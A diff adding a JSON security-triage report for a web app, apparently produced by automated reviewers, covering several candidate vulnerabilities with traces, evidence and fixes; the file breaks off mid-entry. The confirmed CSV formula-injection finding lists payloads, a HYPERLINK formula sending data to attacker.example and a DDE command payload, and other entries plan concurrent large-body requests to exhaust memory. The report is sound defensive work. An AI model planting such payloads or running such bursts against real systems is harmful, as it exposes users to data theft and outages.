@@ -1,0 +1,993 @@
+[
+ {
+  "verdict": "needs_validation",
+  "fingerprint": "auth-mount-unbounded-request-body",
+  "title": "Anonymous unbounded request body on the better-auth mount may exhaust memory on the single 512Mi Cloud Run instance",
+  "description": "The better-auth handler is mounted at /api/auth/*splat before any express.json parser. The mount has no body-size cap, and better-call buffers the whole request body in memory before the route handler runs. An anonymous client can POST a very large JSON body to an /api/auth route such as /api/auth/sign-in/social. The hunter's local run accepted a 32 MiB body and server RSS rose by about 65 MB. Three concurrent 16 MiB bodies raised RSS by about 77 MB. Memory growth is therefore roughly proportional to body size, about 2x. The production service runs a single instance with 512Mi, concurrency 40 and max-instances 1, so a handful of concurrent large bodies could plausibly cause an out-of-memory restart of the only instance. Restart or OOM behaviour on Cloud Run, and the platform's own request-size cap (about 32 MiB on HTTP/1), cannot be observed from source or locally. Per-IP rate limits count requests rather than bytes, and a client can open 6-10 requests within the 10 per minute sign-in limit, so they do not prevent the burst. No crash was demonstrated, so no stronger result is claimed.",
+  "claimed_root_cause": "app.all('/api/auth/*splat', toNodeHandler(auth)) is mounted ahead of the body parsers. There is no pre-handler Content-Length or byte cap, and the better-auth adapter sets no bodySizeLimit. The better-call router awaits getBody(request), which buffers the full body. The other parsed routes are capped (4kb, 4mb and 100kb) but this mount is not.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "server/app.ts",
+    "line": 83,
+    "scope": "createApp /api/auth/sign-in rate limit",
+    "description": "Anonymous POST to /api/auth/sign-in/* passes originGuard (a missing Origin header is allowed) and a request-count rate limit of 10 per minute per IP. The limit does not consider body bytes."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/app.ts",
+    "line": 85,
+    "scope": "createApp better-auth mount",
+    "description": "app.all('/api/auth/*splat', toNodeHandler(auth)) is registered before express.json, so no size limit applies and the raw stream goes straight to better-auth."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/app.ts",
+    "line": 91,
+    "scope": "createApp body parsers",
+    "description": "express.json({limit:'100kb'}) is registered after the auth mount, so it never covers /api/auth. This shows the protection exists elsewhere but not here."
+   },
+   {
+    "kind": "sink",
+    "file": "node_modules/better-call/dist/router.mjs",
+    "line": 67,
+    "scope": "router handler context construction",
+    "description": "body: await getBody(request, allowedMediaTypes) reads and parses the entire request body into memory with no size cap, so heap and RSS grow with the attacker-chosen body size."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "server/app.ts",
+    "line": 85,
+    "description": "I re-read the mount. It has no body cap and sits before every body parser, and the comment says better-auth reads the body itself."
+   },
+   {
+    "file": "server/app.ts",
+    "line": 44,
+    "description": "AUTH_LIMITS is {signIn:10/min, other:120/min} per IP and counts requests only. Bytes per request are not limited, and a few large requests fit inside the limit."
+   },
+   {
+    "file": "node_modules/better-call/dist/router.mjs",
+    "line": 67,
+    "description": "I confirmed that getBody is awaited before middleware and the handler run, with no size check (better-call 1.4.0, better-auth 1.7.7). A grep of server/ for bodyLimit, maxBody or bodySizeLimit found nothing."
+   },
+   {
+    "file": "scripts/deploy-cloud-run.sh",
+    "line": 89,
+    "description": "Deploy uses --max-instances 1 --memory 512Mi --concurrency 40 --timeout 120, so one small instance serves all traffic and 40 requests can be in flight at once."
+   },
+   {
+    "file": "agents/hunt-avail-cloud-w1/artifacts/out/check-1.txt",
+    "line": 8,
+    "description": "Hunter's sandbox measurement on Node 20 with better-auth's in-memory adapter and only the auth mount (no originGuard): a 32 MiB body returned 200 with a peak RSS delta of +65 MB (line 8). Three concurrent 16 MiB bodies gave +77 MB (line 9). Idle RSS was about 87 MB. I read this artifact and did not re-run it."
+   }
+  ],
+  "blockers": [
+   "Whether Cloud Run's front end rejects or buffers oversized requests before the container, and the exact cap (about 32 MiB for HTTP/1), cannot be observed from source or locally.",
+   "The real OOM threshold and restart behaviour under 512Mi, with the production Node 22 runtime, Neon pool and baseline RSS, is unmeasured. Local numbers (about 2x body size, about 90-150 MB idle) suggest roughly 5-8 concurrent 32 MiB bodies would be needed.",
+   "It is unknown whether a container restart causes user-visible downtime. min-instances is 0 and max-instances is 1, so the outage depends on cold-start time and on whether queued requests are retried."
+  ],
+  "validation_plan": {
+   "local": "Non-destructive: run the real server/app.ts createApp with the better-auth in-memory adapter and the Node 22 production Dockerfile image if available. Cap the process heap and memory to 512 MiB (for example a cgroup limit or --max-old-space-size). Send N concurrent 8-32 MiB bodies to POST /api/auth/sign-in/social over a unix socket with no Origin header. Record peak RSS and the N at which the process is killed or returns errors. Then add express.json-style or Content-Length pre-checks on /api/auth and confirm that oversized requests get 413 with no RSS growth.",
+   "deployment": "Owner-run on a staging Cloud Run service with the same 512Mi/concurrency-40 config, never production. Send a bounded set of 6-10 concurrent 20-30 MiB POSTs to /api/auth/sign-in/social from one test IP, and watch the Cloud Run memory-utilization and instance-restart metrics and /api/health responses. Also confirm what status Cloud Run returns for a body over 32 MiB."
+  }
+ },
+ {
+  "verdict": "rejected",
+  "fingerprint": "auth-verification-oauth-state-rows-never-expire",
+  "title": "OAuth state rows in auth.verification claimed to never expire",
+  "description": "Claimed: anonymous POST /api/auth/sign-in/social inserts an auth.verification row (10 min expiresAt) that is only deleted if the state is consumed, with no sweeper or TTL in the repo, so rows accumulate without bound.",
+  "claimed_root_cause": "Database state strategy stores one verification row per sign-in start; the repo adds no TTL or cleanup, and the app rate limiter caps request rate but not retained rows.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "server/app.ts",
+    "line": 83,
+    "scope": "createApp auth routes",
+    "description": "Unauthenticated /api/auth/sign-in is rate limited and then handed to better-auth."
+   },
+   {
+    "kind": "propagation",
+    "file": "node_modules/better-auth/dist/oauth2/state.mjs",
+    "line": 23,
+    "scope": "generateState",
+    "description": "Builds state data with expiresAt = now + 10 min and calls generateGenericState."
+   },
+   {
+    "kind": "sink",
+    "file": "node_modules/better-auth/dist/state.mjs",
+    "line": 79,
+    "scope": "generateGenericState",
+    "description": "createVerificationValue inserts an auth-state:<rand> row into auth.verification."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "node_modules/better-auth/dist/db/internal-adapter.mjs",
+    "line": 753,
+    "description": "findVerificationValue deletes every verification row with expiresAt < now unless options.verification.disableCleanup is set. server/auth/betterAuth.ts:47 sets only modelName for verification, so the sweep is active."
+   },
+   {
+    "file": "node_modules/better-auth/dist/state.mjs",
+    "line": 123,
+    "description": "parseGenericState calls findVerificationValue for any state value on the OAuth callback, so every callback hit (a legitimate Google redirect, or any request with an arbitrary state) sweeps all expired state rows."
+   },
+   {
+    "file": "node_modules/better-auth/dist/api/routes/callback.mjs",
+    "line": 77,
+    "description": "The callback route calls parseState before any other check, so the sweep runs on normal sign-ins and on invalid-state requests alike."
+   },
+   {
+    "file": "server/auth/betterAuth.ts",
+    "line": 47,
+    "description": "The verification table config does not disable cleanup."
+   },
+   {
+    "file": "db/migrations/20261008000001_auth_schema.sql",
+    "line": 49,
+    "description": "auth.verification has an expiresAt column and an identifier index. Nothing in the schema prevents the library sweep."
+   }
+  ],
+  "reason": "The 'no sweeper' premise is false. better-auth's findVerificationValue deletes all expired verification rows on every OAuth callback lookup, and cleanup is not disabled in this repo. Expired state rows are therefore removed on the next sign-in or callback. Residual growth is bounded by the 10/min/IP sign-in limiter over a 10-minute window between callbacks. The only unbounded part is the request body size on the auth routes, which is a separate root cause covered by v04, not this fingerprint. No meaningful cross-boundary impact is demonstrated, and Postgres-backed reproduction was not needed because source refutes the claim."
+ },
+ {
+  "verdict": "needs_validation",
+  "fingerprint": "backup-bucket-soft-delete-outlives-30day-erasure-promise",
+  "title": "Backup bucket soft-delete period is not set, so erased users' dumps may be recoverable past the promised 30 days",
+  "description": "scripts/backup-cloud-run.sh creates the private backup bucket and sets only an age-30 Delete lifecycle rule. It never sets or disables the Cloud Storage soft-delete retention (--soft-delete-duration=0). GCS gives new buckets a default soft-delete window, 7 days for buckets created after the March 2024 change. If that default applies to the live bucket, a dump removed by the lifecycle rule at day 30 stays recoverable for about 7 more days, roughly 37 days after creation. Those dumps hold rows for users who have since erased their data or deleted their account. The in-app notice (DeleteMyData.tsx) and the privacy policy (privacy.html) say backup copies are deleted automatically within 30 days. The mismatch is at most a few days, and the objects are readable only by project principals who hold restore/read rights; the job's service account has objectCreator only. This is a privacy-promise accuracy gap, not an unauthenticated or cross-tenant exposure. The live bucket's soft_delete_policy, and any project-level or organization-level override, cannot be observed from the repository.",
+  "claimed_root_cause": "The bucket-creation and lifecycle configuration in cmd_setup covers only object age. The backup-retention promise in the UI and policy is checked by server/legal.test.ts only against the RETENTION_DAYS constant in the script, so the soft-delete window is not part of the guarantee.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "src/components/settings/DeleteMyData.tsx",
+    "line": 85,
+    "scope": "DeleteMyData component, closing note",
+    "description": "User-facing statement that copies in the nightly backups are deleted automatically within 30 days after the user erases data or deletes the account."
+   },
+   {
+    "kind": "propagation",
+    "file": "public/privacy.html",
+    "line": 94,
+    "scope": "Section 8, retention table, 'Nightly backups' row",
+    "description": "Policy states backups are kept 30 days, then deleted automatically, so erased data is gone from backups within 30 days."
+   },
+   {
+    "kind": "propagation",
+    "file": "backup/run.sh",
+    "line": 25,
+    "scope": "pg_dump invocation",
+    "description": "Each nightly dump is a full pg_dump of the production database (sessions and verification data excluded) uploaded to the bucket, so it contains the live user data of every account at that time."
+   },
+   {
+    "kind": "propagation",
+    "file": "scripts/backup-cloud-run.sh",
+    "line": 34,
+    "scope": "cmd_setup, bucket creation",
+    "description": "gcloud storage buckets create sets only uniform access and public access prevention. It does not set --soft-delete-duration=0, so the platform default soft-delete window applies."
+   },
+   {
+    "kind": "sink",
+    "file": "scripts/backup-cloud-run.sh",
+    "line": 38,
+    "scope": "cmd_setup, lifecycle update",
+    "description": "The only expiry control is a Delete lifecycle rule with condition age=30 (built at line 37). Objects it deletes enter the soft-delete state and remain restorable for the soft-delete window, past the 30 days promised."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "scripts/backup-cloud-run.sh",
+    "line": 37,
+    "description": "Lifecycle JSON contains a single Delete rule with age RETENTION_DAYS (30). No soft-delete, versioning, or retention-policy setting appears anywhere in the script (confirmed by grep for soft_delete/soft-delete across the repository: no hits in scripts/ or backup/)."
+   },
+   {
+    "file": "server/legal.test.ts",
+    "line": 12,
+    "description": "The policy-versus-system test asserts only that RETENTION_DAYS equals 30 and that the policy text says 30 days. It does not check bucket soft-delete, so the gap is untested."
+   },
+   {
+    "file": "public/privacy.html",
+    "line": 94,
+    "description": "The retention row promises that erased data is gone from backups within 30 days, a firm outer bound that a 7-day soft-delete tail would exceed."
+   },
+   {
+    "file": "scripts/backup-cloud-run.sh",
+    "line": 41,
+    "description": "The backup service account holds only roles/storage.objectCreator, so the extra recoverable copies are reachable only by privileged project operators, not by the app or other users. This bounds impact to low."
+   }
+  ],
+  "blockers": [
+   "The live bucket's soft_delete_policy (retentionDurationSeconds) cannot be observed from source. It may be the 7-day default, 0 if set out of band, or overridden by a project or organization default.",
+   "Whether the bucket was created before or after the platform change that made soft delete the default for new buckets is unknown."
+  ],
+  "validation_plan": {
+   "local": "No local reproduction is possible: this is Cloud Storage behaviour. Source review confirms nothing in the repository disables or sets the soft-delete duration.",
+   "deployment": "Project owner runs the read-only command `gcloud storage buckets describe gs://$BUCKET --format='value(soft_delete_policy)'` and checks for retentionDurationSeconds greater than 0. If it is non-zero, either run `gcloud storage buckets update gs://$BUCKET --clear-soft-delete` and add `--soft-delete-duration=0` to the create call in cmd_setup, or change the policy and DeleteMyData.tsx wording to 'within 37 days'. Optionally list soft-deleted objects with `gcloud storage ls --soft-deleted gs://$BUCKET` to see the tail. No data is modified by the check."
+  }
+ },
+ {
+  "verdict": "rejected",
+  "fingerprint": "ci-deployer-builds-editor-default-build-sa-escalation",
+  "title": "CI deployer holds Cloud Build editor at project scope, so a build could run as the default build account",
+  "description": "scripts/ci-deploy-setup.sh grants the GitHub-OIDC deployer service account roles/cloudbuild.builds.editor on the whole project. The restricted iron-log-build account is used only because scripts/deploy-cloud-run.sh passes --service-account. A build submitted without that flag could run as the project's default build account, which the script's own comment says has the Editor role. The header comment says the deployer cannot read the database, secrets or backups. The candidate treats that as a privilege-escalation gap.",
+  "claimed_root_cause": "The least-privilege separation depends on a client-side flag in the deploy script. It is not enforced by IAM, because the deployer keeps project-wide builds.editor and nothing denies it the default build account.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": ".github/workflows/deploy-cloud-run.yml",
+    "line": 36,
+    "scope": "deploy job condition",
+    "description": "The job runs only for workflow_dispatch on refs/heads/main, or for a workflow_run whose Tests run succeeded on a push to main of this same repository. The workflow definition comes from the default branch, and no fork or pull-request code reaches it."
+   },
+   {
+    "kind": "propagation",
+    "file": "scripts/ci-deploy-setup.sh",
+    "line": 41,
+    "scope": "Workload identity provider attribute-condition",
+    "description": "The identity provider only accepts tokens with repository == GITHUB_REPO and ref == refs/heads/main. Only someone who can already merge to main can run code as the deployer."
+   },
+   {
+    "kind": "propagation",
+    "file": "scripts/ci-deploy-setup.sh",
+    "line": 49,
+    "scope": "deployer role loop",
+    "description": "The deployer is granted roles/run.developer and roles/cloudbuild.builds.editor at project scope."
+   },
+   {
+    "kind": "propagation",
+    "file": "scripts/ci-deploy-setup.sh",
+    "line": 53,
+    "scope": "runtime SA actAs binding",
+    "description": "The deployer may act as iron-log-run, the runtime account that has secretAccessor on the database URL and the auth and Google OAuth secrets."
+   },
+   {
+    "kind": "sink",
+    "file": "scripts/deploy-cloud-run.sh",
+    "line": 79,
+    "scope": "cmd_deploy build_as",
+    "description": "The restricted build account is chosen by a script argument. Anyone who controls the main-branch workflow or script can drop the flag or run their own gcloud commands."
+   }
+  ],
+  "evidence": [
+   {
+    "file": ".github/workflows/deploy-cloud-run.yml",
+    "line": 36,
+    "description": "Deploy is gated to successful push-to-main Tests runs of the same repository, or a manual run on main. Fork pull requests cannot trigger it."
+   },
+   {
+    "file": "scripts/ci-deploy-setup.sh",
+    "line": 41,
+    "description": "The provider condition limits the deployer identity to this repository's main branch. The only party who can exploit the claimed gap is one who can already change the workflow code on main, which is the repository owner and the deploy authority."
+   },
+   {
+    "file": "scripts/ci-deploy-setup.sh",
+    "line": 53,
+    "description": "The deployer can deploy a Cloud Run revision with arbitrary code as iron-log-run, which holds the database and auth secrets. Anyone controlling the deployer can already read those secrets by deploying a revision that prints them. The escalation through the default build account therefore adds no authority the identity does not already have, and the header comment at L9-10 is already inaccurate on this point."
+   },
+   {
+    "file": "scripts/ci-deploy-setup.sh",
+    "line": 11,
+    "description": "The script documents the default-account fallback and the Editor risk, so this is a known and accepted design property."
+   },
+   {
+    "file": ".github/workflows/deploy-cloud-run.yml",
+    "line": 89,
+    "description": "CI passes BUILD_SA explicitly, so the shipped pipeline always builds as the restricted account."
+   },
+   {
+    "file": "cloudbuild.yaml",
+    "line": 15,
+    "description": "The build config is fixed in the repository and has no attacker-controlled input."
+   }
+  ],
+  "reason": "There is no lower-trust entrypoint. The deployer identity is reachable only from workflow code on this repository's main branch, so the attacker would already control the deploy authority. The shipped pipeline always passes the restricted build account. Even if that flag were bypassed, the same identity can already deploy arbitrary code as the runtime account that holds the database and OAuth secrets, so the default-account route adds no cross-boundary impact. Whether the default build account would be usable also depends on project facts that cannot be seen in the repository (age of the project, org policy, actAs requirements). What remains is a hardening and documentation item: the setup script's comment overstates the deployer's confinement. It could say so, or the deployer could be given tighter or conditioned roles."
+ },
+ {
+  "verdict": "rejected",
+  "fingerprint": "ci-deployer-run-developer-backup-job-override",
+  "title": "CI deployer service account holds roles/run.developer, which could in theory run the backup job with overridden args",
+  "description": "The candidate claims that the CI deployer service account has roles/run.developer at project scope. It further claims that the nightly backup Cloud Run job holds the owner-level BACKUP_DATABASE_URL secret on the postgres:18-alpine image, whose entrypoint execs any args. If run.jobs.runWithOverrides is in that role, the deployer could run the job with an args override and execute commands that hold the owner DB URL.",
+  "claimed_root_cause": "Project-wide roles/run.developer granted to the deployer SA is broader than the deploy needs. It also covers the backup job, which mounts a more privileged secret (the unpooled owner DB URL).",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "scripts/ci-deploy-setup.sh",
+    "line": 49,
+    "scope": "ci-deploy-setup.sh role loop",
+    "description": "The deployer SA is granted roles/run.developer at project scope. The SA can be assumed only by GitHub OIDC tokens from this repository on refs/heads/main (provider attribute-condition at L40, binding at L45-46)."
+   },
+   {
+    "kind": "propagation",
+    "file": "scripts/backup-cloud-run.sh",
+    "line": 65,
+    "scope": "cmd_deploy",
+    "description": "The backup job is created or updated in the same project with a dedicated service account, so project-scope run.developer covers it."
+   },
+   {
+    "kind": "propagation",
+    "file": "scripts/backup-cloud-run.sh",
+    "line": 66,
+    "scope": "cmd_deploy",
+    "description": "BACKUP_DATABASE_URL (the owner URL) is mounted into the job container from Secret Manager."
+   },
+   {
+    "kind": "sink",
+    "file": "backup/Dockerfile",
+    "line": 7,
+    "scope": "Dockerfile",
+    "description": "The image is FROM postgres:18-alpine and defines only CMD [\"/run.sh\"]. The base image's docker-entrypoint.sh therefore execs a non-postgres first argument as-is, so an args override would run arbitrary commands with the secret in its environment."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "scripts/ci-deploy-setup.sh",
+    "line": 40,
+    "description": "The WIF provider attribute-condition restricts tokens to assertion.repository == GITHUB_REPO and assertion.ref == 'refs/heads/main'. No pull-request, fork or other lower-trust token can assume the deployer."
+   },
+   {
+    "file": ".github/workflows/deploy-cloud-run.yml",
+    "line": 12,
+    "description": "The only workflow that uses the deployer runs on workflow_run (Tests, branches: main) or workflow_dispatch, and uses environment: production. Its code comes from the repo's main branch."
+   },
+   {
+    "file": "scripts/ci-deploy-setup.sh",
+    "line": 49,
+    "description": "The same deployer already deploys arbitrary code as the runtime SA, which holds the app's DB and auth secrets. Whoever controls main already has code execution inside the production trust domain. The override path adds scope (the backup owner URL) but no new principal."
+   },
+   {
+    "file": "backup/Dockerfile",
+    "line": 7,
+    "description": "Only CMD is set, so the override mechanics are plausible in principle. Whether run.developer includes run.jobs.runWithOverrides is Google IAM role content and cannot be observed from the repo or locally."
+   }
+  ],
+  "reason": "There is no lower-trust party in the path. The deployer SA can be assumed only by this repository's main-branch workflow, whose code is controlled by the maintainer. A party that can run that workflow can already edit it or merge code to main, and so already deploys arbitrary code with production runtime secrets. Reaching the backup job's owner URL through args overrides crosses no new authority boundary. At most it widens the blast radius of an already-trusted CI identity, which is least-privilege hardening and not a vulnerability. The hunter's second blocker (whether the deploy job is reachable by a lower-trust party) is answered by source as no: WIF is limited to repo and main, and the repository's own CLAUDE.md and workflow show no PR-triggered path to the deployer. The first blocker, role contents, would only change how large the hardening gap is. Optional hardening: scope run.developer to the service with a resource-level binding instead of project scope, or add an IAM condition excluding the backup job."
+ },
+ {
+  "verdict": "rejected",
+  "fingerprint": "excelImport.readWeeks.warm.inherited-builtin-member-write",
+  "title": "Crafted .xlsx Check-offs 'warm' row writes onto an inherited Object.prototype member (in-memory only)",
+  "description": "In readWeeks, a Check-offs row with kind 'warm' and key 'hasOwnProperty/call' reaches (w.warm[day] = w.warm[day] || {})[item] = value. w.warm is a plain {} from normWeek, so w.warm['hasOwnProperty'] resolves to the inherited Object.prototype.hasOwnProperty function. The code then sets .call = true on that function. The UNSAFE_KEY denylist only covers __proto__, constructor and prototype. The primitive is real and I reproduced it in the sandbox: Object.prototype.hasOwnProperty.call then becomes true and calling it throws a TypeError. It does not amount to a vulnerability. The value written is only a boolean, no attacker string or object is written, nothing is persisted, and a reload clears it. It also needs the user to select a hostile .xlsx.",
+  "claimed_root_cause": "The warm-key denylist is incomplete. Keys that resolve to inherited Object.prototype members (hasOwnProperty, toString, valueOf and so on) are not blocked, and w.warm[day] is looked up on a normal-prototype object.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "src/store/settingsSlice.ts",
+    "line": 33,
+    "scope": "readImportFile",
+    "description": "The user picks an .xlsx file. It is parsed by parseExcelExport when the file is selected, before any confirm step."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/lib/excelImport.ts",
+    "line": 167,
+    "scope": "readWeeks",
+    "description": "The row's kind and key are split on '/'. Only __proto__, constructor and prototype are rejected."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/shared/week.ts",
+    "line": 22,
+    "scope": "normWeek",
+    "description": "normWeek builds the week with warm: {}, a plain object with a normal prototype."
+   },
+   {
+    "kind": "sink",
+    "file": "src/lib/excelImport.ts",
+    "line": 167,
+    "scope": "readWeeks",
+    "description": "The assignment (w.warm[day] = w.warm[day] || {})[item] = (v === 'Yes') sets a boolean property on the inherited function."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "src/lib/excelImport.ts",
+    "line": 24,
+    "description": "UNSAFE_KEY is limited to __proto__, constructor and prototype."
+   },
+   {
+    "file": "src/lib/excelImport.ts",
+    "line": 167,
+    "description": "The warm branch does a plain-object lookup and assignment with attacker-chosen day and item."
+   },
+   {
+    "file": "src/shared/week.ts",
+    "line": 22,
+    "description": "normWeek's cleanMap/UNSAFE set also does not stop inherited names. A normal-prototype warm object is used afterwards."
+   },
+   {
+    "file": "agents/ver-v01/artifacts/out/check-1.txt",
+    "line": 1,
+    "description": "The sandbox run reproduced the write: own call=true, and hasOwnProperty.call({}, 'x') throws a TypeError."
+   }
+  ],
+  "reason": "The mutation is real, but there is no demonstrated cross-boundary impact. (1) It only writes the booleans true/false onto properties of built-in functions, so there is no attacker-controlled code, string or object, and no privilege or data crossing. (2) It is in-memory in the importing tab only. It is never stored in the DB, the store or the sync payload, and a reload clears it. (3) The user must choose to open a hostile workbook; an attacker who can get a hostile file imported can already inject arbitrary (validated) data through the normal merge. (4) The only consequence shown is a transient break of Object.prototype.hasOwnProperty.call in that tab, a self-inflicted nuisance. I found no application path that turns this into a security effect. Treat it as hardening: use Object.create(null) or Object.hasOwn checks, or a Map, for warm, and reject keys that exist on Object.prototype."
+ },
+ {
+  "verdict": "confirmed",
+  "fingerprint": "export.buildCsv.csv-formula-injection-unneutralised-cells",
+  "title": "CSV export does not neutralise spreadsheet formula prefixes in imported notes and exercise names",
+  "description": "buildCsv writes free-text fields (log note, custom exercise name) through csvCell, which only quotes values containing comma, double quote, CR or LF. A value starting with =, +, - or @ is emitted as a live formula cell. Those fields are only length-capped when imported from a JSON data file, Excel workbook or CSV export, so a hostile file supplied to the user can plant formula text that runs when the user later exports a CSV and opens it in Excel, LibreOffice or Sheets. The XLSX builders are not affected because SheetJS writes strings as t:'s' cells. Impact is limited and needs user interaction: the user must import an untrusted file, export CSV, open it in a spreadsheet and accept any prompts.",
+  "root_cause": "csvCell escapes only CSV structural characters. It has no OWASP-style formula neutralisation (a leading apostrophe or tab before cells starting with = + - @ or CR/TAB). Import normalisation (text() in validate.ts) only truncates length, so formula-leading strings survive into the store and the export.",
+  "intended_behavior": "Exported CSV cells containing user or imported text should be neutralised so a spreadsheet treats them as text, never as a formula, regardless of what the data file contained.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "src/lib/export.ts",
+    "line": 191,
+    "scope": "normalizeData (data file / workbook import)",
+    "description": "Untrusted imported file contents (logs, custom exercise config) are passed to normalisation; this is the lower-trust input from whoever supplied the file."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/shared/validate.ts",
+    "line": 84,
+    "scope": "normEntry",
+    "description": "Note e.n is kept via text(e.n, LIMITS.text.note), which only slices to a max length (text() at line 64). A leading =, +, - or @ is preserved."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/store/useAppStore.ts",
+    "line": 794,
+    "scope": "exportCsv",
+    "description": "User-triggered CSV export passes the snapshot (including imported logs and cfg) to buildCsv."
+   },
+   {
+    "kind": "propagation",
+    "file": "src/lib/export.ts",
+    "line": 33,
+    "scope": "buildCsv row construction",
+    "description": "Row includes exInfo(cfg,id).n (exercise name) and noteOf(e) (note) as raw strings."
+   },
+   {
+    "kind": "sink",
+    "file": "src/lib/export.ts",
+    "line": 28,
+    "scope": "csvCell",
+    "description": "Only quotes for , \" CR LF; does not prefix cells beginning with = + - @, so formula text reaches the CSV unneutralised."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "src/lib/export.ts",
+    "line": 28,
+    "description": "csvCell regex /[\",\\n\\r]/ is the only transformation; no formula-prefix handling."
+   },
+   {
+    "file": "src/lib/export.ts",
+    "line": 33,
+    "description": "Exercise name and note are emitted directly as CSV cells."
+   },
+   {
+    "file": "src/shared/validate.ts",
+    "line": 84,
+    "description": "Note is only length-capped on import; text() at line 64 does not strip or escape leading formula characters."
+   },
+   {
+    "file": "src/store/useAppStore.ts",
+    "line": 794,
+    "description": "exportCsv downloads buildCsv(get().snapshot()) with the imported data included."
+   },
+   {
+    "file": "src/lib/export.ts",
+    "line": 197,
+    "description": "Imported logs pass through normEntries, which retains note text containing formula prefixes."
+   }
+  ],
+  "conditions": [
+   {
+    "kind": "user_interaction",
+    "description": "Victim imports an attacker-supplied data file, workbook or CSV, then exports CSV and opens it in a spreadsheet application."
+   },
+   {
+    "kind": "user_interaction",
+    "description": "Spreadsheet may show a warning (e.g. DDE or external-content prompt) that the victim must accept for some payloads; HYPERLINK-style formulas need a click."
+   },
+   {
+    "kind": "environmental_dependency",
+    "description": "Spreadsheet application evaluates leading = + - @ cells from a .csv file (default behaviour in Excel and LibreOffice)."
+   }
+  ],
+  "execution": {
+   "attacker_perspective": "Someone who can get a crafted Iron Log JSON data file or xlsx workbook to the victim (for example a shared training log or backup) and have the victim import it.",
+   "payloads": [
+    "note: =HYPERLINK(\"http://attacker.example/?\"&A2,\"Squat\")",
+    "note: =cmd|' /C calc'!A0"
+   ],
+   "instructions": [
+    "Craft a data file whose log entry has n set to a string starting with '='.",
+    "Victim imports the file (normEntry keeps n, length-capped only).",
+    "Victim triggers Export CSV; buildCsv emits the note unquoted/unprefixed in the note column.",
+    "Victim opens the CSV in a spreadsheet; the cell is interpreted as a formula."
+   ],
+   "observed_result": "Source-level demonstration, consistent with the hunter's sandbox artifact (agents/hunt-client3-w3/artifacts/out/check-2.txt): csvCell passes a note beginning with = through unchanged, e.g. CSV row ...,=cmd|' /C calc'!A0,, and the exercise name =HYPERLINK(...) is only quoted because of its embedded quotes and commas, not neutralised. The xlsx cells came out as t:'s' strings, so only the CSV path is affected. I did not re-execute it; the code path is short and fully visible in source."
+  },
+  "remediation": {
+   "strategy": "In csvCell, prefix any string cell whose first character is =, +, -, @, tab or CR with a single quote (and still apply CSV quoting). Apply it only to text fields (exercise name, note, set_detail, muscle names), so numeric columns such as negative weights stay numeric. Optionally strip or reject leading formula characters in normEntry for note and in exercise-name normalisation.",
+   "code_changes": [
+    {
+     "file_name": "src/lib/export.ts",
+     "fixed_code": "function csvCell(v: unknown) { let t = v == null ? '' : String(v); if (typeof v === 'string' && /^[=+\\-@\\t\\r]/.test(t)) t = \"'\" + t; return /[\",\\n\\r]/.test(t) ? '\"' + t.replace(/\"/g, '\"\"') + '\"' : t; }"
+    }
+   ]
+  },
+  "severity": {
+   "likelihood": {
+    "score": "low",
+    "reason": "Requires the victim to import an untrusted file, export a CSV, open it in a spreadsheet and often accept a warning or click. The app has no sharing between users, so the only source is a file the user chooses to import."
+   },
+   "impact": {
+    "score": "low",
+    "reason": "Formula runs in the victim's spreadsheet only. Most payloads need acknowledgement, and the data in the CSV is the user's own training log. No server or other user data is reachable from the app."
+   },
+   "overall_severity": "low"
+  },
+  "confidence": {
+   "score": "medium",
+   "reason": "The source path is unambiguous and matches the hunter's artifact. Real-world exploitability depends on spreadsheet application behaviour and user prompts, which cannot be observed from the repository."
+  }
+ },
+ {
+  "verdict": "rejected",
+  "fingerprint": "health-db-before-api-rate-limit",
+  "title": "Unauthenticated /api/health/db runs select 1 ahead of the /api rate limiter (hardening only)",
+  "description": "GET /api/health/db is registered before rateLimit(limits.api), so any anonymous caller can trigger a trivial `select 1` on the shared pg pool with no per-IP limit. The source comment at app.ts L118 says an anonymous flood never reaches the database, which this route contradicts. The claim is accurate as source, but it is a deliberate liveness probe. Its cost is one constant-time query with no data access, no user-controlled input and no amplification. The extra exposure over the unlimited anonymous routes (/api/health, static files, SPA fallback) is marginal, and an attacker needs a network-level flood to matter. No confidentiality or integrity impact exists, and nothing demonstrates an availability impact beyond what a generic request flood already causes. The Neon scale-to-zero and cost angle depends on plan and quota facts outside the repository, so it is a hardening note, not a demonstrated vulnerability.",
+  "claimed_root_cause": "The DB-backed health route is mounted before the /api rate limiter and the sessionAuth gate, so anonymous requests reach the database pool unthrottled.",
+  "trace": [
+   {
+    "kind": "entrypoint",
+    "file": "server/app.ts",
+    "line": 98,
+    "scope": "createApp: app.get('/api/health/db')",
+    "description": "Anonymous GET handler, registered after the body parsers and before clientVersionGate, rateLimit(limits.api) and sessionAuth."
+   },
+   {
+    "kind": "propagation",
+    "file": "server/app.ts",
+    "line": 104,
+    "scope": "createApp: /api/health/db handler",
+    "description": "Runs the fixed statement `select 1` through Kysely on the shared pool; no request data is used in the query."
+   },
+   {
+    "kind": "sink",
+    "file": "server/db/connection.ts",
+    "line": 11,
+    "scope": "createDb: pg.Pool",
+    "description": "Shared pg pool with default size (about 10). Each probe holds a connection for roughly one round trip, and the pool queues extra requests."
+   }
+  ],
+  "evidence": [
+   {
+    "file": "server/app.ts",
+    "line": 118,
+    "description": "The comment says the per-address limit comes first so an anonymous flood never reaches the database. Order is L98 (health/db) then L119 (rateLimit). The comment overstates the guarantee, and the health route is a documented exception."
+   },
+   {
+    "file": "scripts/ci-deploy.sh",
+    "line": 28,
+    "description": "The deploy smoke test intentionally calls /api/health/db and requires 200 from it, so the endpoint is a purposeful deployment check, and moving it behind the limiter would risk smoke-test failures."
+   },
+   {
+    "file": "server/app.ts",
